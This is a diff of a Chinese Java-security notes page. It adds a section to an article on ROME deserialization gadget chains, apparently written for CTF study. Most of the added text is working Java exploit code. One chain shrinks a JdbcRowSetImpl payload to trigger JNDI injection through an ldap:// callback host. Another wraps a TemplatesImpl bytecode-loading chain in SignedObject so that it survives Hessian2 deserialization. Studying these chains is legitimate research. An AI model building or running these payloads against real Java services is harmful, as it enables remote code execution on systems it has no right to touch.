@@ -943,6 +943,13 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#二次反序列化绕过方式" class="md-nav__link">
+    二次反序列化绕过方式
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#参考文章" class="md-nav__link">
     参考文章
   </a>
@@ -1053,6 +1060,20 @@
   
   
     <li class="md-nav__item">
+      <a href="../../java%E5%AE%89%E5%85%A8/OGNL/" class="md-nav__link">
+        OGNL
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../../java%E5%AE%89%E5%85%A8/RMI/" class="md-nav__link">
         RMI
       </a>
@@ -1070,18 +1091,18 @@
     <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2_3_5" data-md-state="indeterminate" type="checkbox" id="__nav_4_2_3_5" checked>
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2_3_6" data-md-state="indeterminate" type="checkbox" id="__nav_4_2_3_6" checked>
       
       
       
       
-        <label class="md-nav__link" for="__nav_4_2_3_5">
+        <label class="md-nav__link" for="__nav_4_2_3_6">
           内存马
           <span class="md-nav__icon md-icon"></span>
         </label>
       
       <nav class="md-nav" aria-label="内存马" data-md-level="4">
-        <label class="md-nav__title" for="__nav_4_2_3_5">
+        <label class="md-nav__title" for="__nav_4_2_3_6">
           <span class="md-nav__icon md-icon"></span>
           内存马
         </label>
@@ -1159,18 +1180,18 @@
     <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2_3_6" data-md-state="indeterminate" type="checkbox" id="__nav_4_2_3_6" checked>
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2_3_7" data-md-state="indeterminate" type="checkbox" id="__nav_4_2_3_7" checked>
       
       
       
       
-        <label class="md-nav__link" for="__nav_4_2_3_6">
+        <label class="md-nav__link" for="__nav_4_2_3_7">
           组件安全
           <span class="md-nav__icon md-icon"></span>
         </label>
       
       <nav class="md-nav" aria-label="组件安全" data-md-level="4">
-        <label class="md-nav__title" for="__nav_4_2_3_6">
+        <label class="md-nav__title" for="__nav_4_2_3_7">
           <span class="md-nav__icon md-icon"></span>
           组件安全
         </label>
@@ -2224,7 +2245,7 @@
           ...
 </code></pre></div>
 <h2 id="新链2不符合题目要求">新链2(不符合题目要求)<a class="headerlink" href="#新链2不符合题目要求" title="Permanent link">#</a></h2>
-<p>实际上我们知道<code>pReadMethod.invoke(_obj,NO_PARAMS)</code>最终会调用到_obj的所有getter方法，根据我们对反序列化链的了解，实际上我们也可以利用<code>JdbcRowSetImpl.getDatabaseMetaData()</code>方法最终触发JNDI注入，我们只需要将sink修改一下即可:<br />
+<p>实际上我们知道<code>pReadMethod.invoke(_obj,NO_PARAMS)</code>最终会调用到_obj的所有getter方法，根据我们对反序列化链的了解，我们也可以利用<code>JdbcRowSetImpl.getDatabaseMetaData()</code>方法最终触发JNDI注入，我们只需要将sink修改一下即可:<br />
 <div class="highlight"><pre><span></span><code><span class="kn">package</span> <span class="nn">top.longlone</span><span class="p">;</span>
 
 <span class="kn">import</span> <span class="nn">com.sun.rowset.JdbcRowSetImpl</span><span class="p">;</span>
@@ -2281,6 +2302,118 @@
 </code></pre></div><br />
 但是当我们运行程序时很遗憾地发现长度还是超出了1956:<br />
 <img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220307113636.png" /></p>
+<p>新链2长度很大的原因是因为 <code>JdbcRowSetImpl</code> 这个类的对象太大了，方法巨多，本来优化的思路是用ASM把没用的属性和方法全部扬了，但是这个类的类加载器是 <code>BootStrap</code> ，位于双亲委派的最顶层，所以修改过后的字节码没办法再次加载。</p>
+<p>另一个优化思路是把没用的属性全部改为null，但是要注意不能影响sink的最终执行结果，所以这里要对照 <code>pds[]</code> 中 getter 方法的顺序选择对应的属性进行修改：<br />
+<div class="highlight"><pre><span></span><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ROME_JNDI</span> <span class="p">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+        <span class="n">JdbcRowSetImpl</span> <span class="n">jdbcRowSet</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JdbcRowSetImpl</span><span class="p">();</span>
+        <span class="n">jdbcRowSet</span><span class="p">.</span><span class="na">setDataSourceName</span><span class="p">(</span><span class="s">&quot;ldap://1tqzc9.dnslog.cn/&quot;</span><span class="p">);</span>
+        <span class="n">jdbcRowSet</span><span class="p">.</span><span class="na">setMatchColumn</span><span class="p">(</span><span class="s">&quot;a&quot;</span><span class="p">);</span>
+
+        <span class="n">clear</span><span class="p">(</span><span class="n">jdbcRowSet</span><span class="p">);</span>
+
+        <span class="n">EqualsBean</span> <span class="n">equalsBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">EqualsBean</span><span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span> <span class="s">&quot;&quot;</span><span class="p">);</span>
+        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">innerMap1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span>
+        <span class="n">innerMap1</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;zZ&quot;</span><span class="p">,</span> <span class="n">equalsBean</span><span class="p">);</span>
+        <span class="n">innerMap1</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;yy&quot;</span><span class="p">,</span> <span class="n">jdbcRowSet</span><span class="p">);</span>
+        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">innerMap2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span>
+        <span class="n">innerMap2</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;zZ&quot;</span><span class="p">,</span> <span class="n">jdbcRowSet</span><span class="p">);</span>
+        <span class="n">innerMap2</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;yy&quot;</span><span class="p">,</span> <span class="n">equalsBean</span><span class="p">);</span>
+
+        <span class="n">Hashtable</span> <span class="n">table</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="p">();</span>
+        <span class="n">table</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">innerMap1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="n">table</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">innerMap2</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+
+        <span class="n">Utils</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">equalsBean</span><span class="p">,</span> <span class="s">&quot;_beanClass&quot;</span><span class="p">,</span> <span class="n">JdbcRowSetImpl</span><span class="p">.</span><span class="na">class</span><span class="p">);</span>
+        <span class="n">Utils</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">equalsBean</span><span class="p">,</span> <span class="s">&quot;_obj&quot;</span><span class="p">,</span> <span class="n">jdbcRowSet</span><span class="p">);</span>
+
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="k">new</span> <span class="n">BASE64Encoder</span><span class="p">().</span><span class="na">encode</span><span class="p">(</span><span class="n">Utils</span><span class="p">.</span><span class="na">serialize</span><span class="p">(</span><span class="n">table</span><span class="p">)).</span><span class="na">length</span><span class="p">());</span>
+
+        <span class="n">Utils</span><span class="p">.</span><span class="na">unserialize</span><span class="p">(</span><span class="n">Utils</span><span class="p">.</span><span class="na">serialize</span><span class="p">(</span><span class="n">table</span><span class="p">));</span>
+    <span class="p">}</span>
+
+    <span class="kd">static</span> <span class="kt">void</span> <span class="nf">clear</span><span class="p">(</span><span class="n">JdbcRowSetImpl</span> <span class="n">jdbcRowSet</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+        <span class="n">Utils</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">jdbcRowSet</span><span class="p">,</span> <span class="s">&quot;iMatchColumns&quot;</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
+        <span class="n">Utils</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">jdbcRowSet</span><span class="p">,</span> <span class="s">&quot;resBundle&quot;</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
+        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="n">BaseRowSet</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span>
+        <span class="n">Field</span> <span class="n">fee</span> <span class="o">=</span> <span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&quot;listeners&quot;</span><span class="p">);</span>
+        <span class="n">fee</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+        <span class="n">fee</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">jdbcRowSet</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
+
+        <span class="n">fee</span> <span class="o">=</span> <span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&quot;params&quot;</span><span class="p">);</span>
+        <span class="n">fee</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+        <span class="n">fee</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">jdbcRowSet</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><br />
+最后长度为：<br />
+<img alt="" src="https://syclover.feishu.cn/space/api/box/stream/download/asynccode/?code=MTYzOTBiOWY0ZGJhZmIxZTc4MTk3NGNhZmUzMzI5NTJfd2V6RFdKQmhJd3RVeGRFcWJmN1BSRTIxeUp2RTlOOUlfVG9rZW46Ym94Y25ZUE1tVVdYY3hQNDUxNXJwOEpEWkVjXzE2NDY4ODcyMDU6MTY0Njg5MDgwNV9WNA" /><br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220321143222.png" /></p>
+<h2 id="二次反序列化绕过方式">二次反序列化绕过方式<a class="headerlink" href="#二次反序列化绕过方式" title="Permanent link">#</a></h2>
+<p>有时候我们会遇到一些其他的反序列化方式，例如Hessian(2)，如果使用这种序列化/反序列化的话，我们的链可能会出现问题，原因是我们的Sink不能再使用TemplatesImpl类，原因是: 这种反序列化不会触发<code>TemplatesImpl.readObject()</code>方法，导致反序列化出来的<code>TemplatesImpl._tfactory</code>属性为空(这个属性存在transient关键字修饰，无法序列化)，这样导致我们最后没办法利用<code>TemplatesImpl#defineTransletClasses</code>方法去实现任意java代码执行。</p>
+<p>在这种情况下实际上我们就只剩下JNDI这一条路，但加入目标不出网/JDK版本过高的话，JNDI是不好用的，还有其他方法吗？</p>
+<p>答案是二次反序列化，我们知道EqualsBean/ToStringBean这几个类最终会触发某个类的所有getter，那么假如存在一个类其getter方法又会使用java原生反序列化，而且其反序列化内容我们可以控制的话，我们就可以进行绕过了，这个类正是<code>java.security.SignedObject</code>:<br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220321144705.png" /></p>
+<p>那么我们去找下这个类的用法，其构造方法的第一个参数会被序列化然后存放到<code>SignedObject.content</code>中:<br />
+<div class="highlight"><pre><span></span><code><span class="n">KeyPairGenerator</span> <span class="n">kpg</span> <span class="o">=</span> <span class="n">KeyPairGenerator</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&quot;DSA&quot;</span><span class="p">);</span>
+<span class="n">kpg</span><span class="p">.</span><span class="na">initialize</span><span class="p">(</span><span class="mi">1024</span><span class="p">);</span>
+<span class="n">KeyPair</span> <span class="n">kp</span> <span class="o">=</span> <span class="n">kpg</span><span class="p">.</span><span class="na">generateKeyPair</span><span class="p">();</span>
+<span class="n">SignedObject</span> <span class="n">signedObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SignedObject</span><span class="p">(</span><span class="s">&quot;secret&quot;</span><span class="p">,</span> <span class="n">kp</span><span class="p">.</span><span class="na">getPrivate</span><span class="p">(),</span> <span class="n">Signature</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&quot;DSA&quot;</span><span class="p">));</span>
+</code></pre></div></p>
+<p>通过使用这个类，我们可以最终构造出二次反序列化的payload:<br />
+<div class="highlight"><pre><span></span><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ROMETools</span> <span class="p">{</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Hashtable</span> <span class="nf">getPayload</span> <span class="p">(</span><span class="n">Class</span> <span class="n">clazz</span><span class="p">,</span> <span class="n">Object</span> <span class="n">payloadObj</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">EqualsBean</span> <span class="n">bean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">EqualsBean</span><span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span> <span class="s">&quot;s&quot;</span><span class="p">);</span>
+
+        <span class="n">HashMap</span> <span class="n">map1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="p">();</span>
+        <span class="n">HashMap</span> <span class="n">map2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="p">();</span>
+        <span class="n">map1</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;yy&quot;</span><span class="p">,</span> <span class="n">bean</span><span class="p">);</span>
+        <span class="n">map1</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;zZ&quot;</span><span class="p">,</span> <span class="n">payloadObj</span><span class="p">);</span>
+        <span class="n">map2</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;zZ&quot;</span><span class="p">,</span> <span class="n">bean</span><span class="p">);</span>
+        <span class="n">map2</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;yy&quot;</span><span class="p">,</span> <span class="n">payloadObj</span><span class="p">);</span>
+        <span class="n">Hashtable</span> <span class="n">table</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="p">();</span>
+        <span class="n">table</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">map1</span><span class="p">,</span> <span class="s">&quot;1&quot;</span><span class="p">);</span>
+        <span class="n">table</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">map2</span><span class="p">,</span> <span class="s">&quot;2&quot;</span><span class="p">);</span>
+        <span class="n">Utils</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">bean</span><span class="p">,</span> <span class="s">&quot;beanClass&quot;</span><span class="p">,</span> <span class="n">clazz</span><span class="p">);</span>
+        <span class="n">Utils</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">bean</span><span class="p">,</span> <span class="s">&quot;obj&quot;</span><span class="p">,</span> <span class="n">payloadObj</span><span class="p">);</span>
+
+        <span class="k">return</span> <span class="n">table</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+        <span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="p">();</span>
+        <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span>
+        <span class="n">CtClass</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">pool</span><span class="p">.</span><span class="na">getCtClass</span><span class="p">(</span><span class="s">&quot;top.longlone.A&quot;</span><span class="p">);</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">clazz</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span>
+
+        <span class="n">Utils</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span> <span class="s">&quot;_bytecodes&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">bytes</span><span class="p">});</span>
+        <span class="n">Utils</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span> <span class="s">&quot;_name&quot;</span><span class="p">,</span> <span class="s">&quot;A&quot;</span><span class="p">);</span>
+
+        <span class="n">Hashtable</span> <span class="n">table1</span> <span class="o">=</span> <span class="n">getPayload</span><span class="p">(</span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">,</span> <span class="n">templates</span><span class="p">);</span>
+
+        <span class="n">KeyPairGenerator</span> <span class="n">kpg</span> <span class="o">=</span> <span class="n">KeyPairGenerator</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&quot;DSA&quot;</span><span class="p">);</span>
+        <span class="n">kpg</span><span class="p">.</span><span class="na">initialize</span><span class="p">(</span><span class="mi">1024</span><span class="p">);</span>
+        <span class="n">KeyPair</span> <span class="n">kp</span> <span class="o">=</span> <span class="n">kpg</span><span class="p">.</span><span class="na">generateKeyPair</span><span class="p">();</span>
+        <span class="n">SignedObject</span> <span class="n">signedObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SignedObject</span><span class="p">(</span><span class="n">table1</span><span class="p">,</span> <span class="n">kp</span><span class="p">.</span><span class="na">getPrivate</span><span class="p">(),</span>
+                <span class="n">Signature</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&quot;DSA&quot;</span><span class="p">));</span>
+
+        <span class="n">Hashtable</span> <span class="n">table2</span> <span class="o">=</span> <span class="n">getPayload</span><span class="p">(</span><span class="n">SignedObject</span><span class="p">.</span><span class="na">class</span><span class="p">,</span> <span class="n">signedObject</span><span class="p">);</span>
+
+        <span class="n">ByteArrayOutputStream</span> <span class="n">bos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="p">();</span>
+        <span class="n">Hessian2Output</span> <span class="n">hessianOutput</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hessian2Output</span><span class="p">(</span><span class="n">bos</span><span class="p">);</span>
+        <span class="n">hessianOutput</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">table2</span><span class="p">);</span>
+        <span class="n">hessianOutput</span><span class="p">.</span><span class="na">getBytesOutputStream</span><span class="p">().</span><span class="na">flush</span><span class="p">();</span>
+        <span class="n">hessianOutput</span><span class="p">.</span><span class="na">completeMessage</span><span class="p">();</span>
+        <span class="n">hessianOutput</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
+
+        <span class="n">ByteArrayInputStream</span> <span class="n">bis</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">bos</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">());</span>
+        <span class="n">Hessian2Input</span> <span class="n">hessianInput</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hessian2Input</span><span class="p">(</span><span class="n">bis</span><span class="p">);</span>
+        <span class="n">hessianInput</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span>
+
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></p>
 <h2 id="参考文章">参考文章<a class="headerlink" href="#参考文章" title="Permanent link">#</a></h2>
 <ul>
 <li><a href="https://c014.cn/blog/java/ROME/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html">https://c014.cn/blog/java/ROME/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html</a></li>
